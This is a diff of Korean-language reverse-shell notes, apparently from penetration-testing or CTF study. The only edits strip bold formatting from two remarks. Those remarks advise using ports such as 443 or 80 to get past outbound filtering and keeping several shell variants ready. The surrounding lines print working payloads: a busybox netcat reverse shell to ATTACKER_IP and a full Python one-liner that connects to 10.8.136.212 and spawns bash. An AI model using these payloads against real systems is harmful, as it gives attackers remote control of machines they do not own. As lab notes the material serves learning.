@@ -17,7 +17,7 @@ python3 -m http.server 8000
 # 설명: 파이썬 3 내장 모듈을 사용하여 8000 포트에서 HTTP 서버를 시작합니다.
 ```
 
-> **4444 같은 포트는 아예 outbound 에서 막아버릴 수 있으므로 443, 8080, 80 같은 신뢰성 있는 포트로 대체 테스트 필요**
+> 4444 같은 포트는 아예 outbound 에서 막아버릴 수 있으므로 443, 8080, 80 같은 신뢰성 있는 포트로 대체 테스트 필요
 
 ### \# step 2 payload named a pipe reverse shell (Using a reverse or bind shell)
 
@@ -120,7 +120,7 @@ busybox nc ATTACKER_IP 443 -e sh
 
 ### 📢 환경별 주요 명령어 (코드 블록)
 
-**# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비**
+# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비
 
 ```sh
 Python,"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"
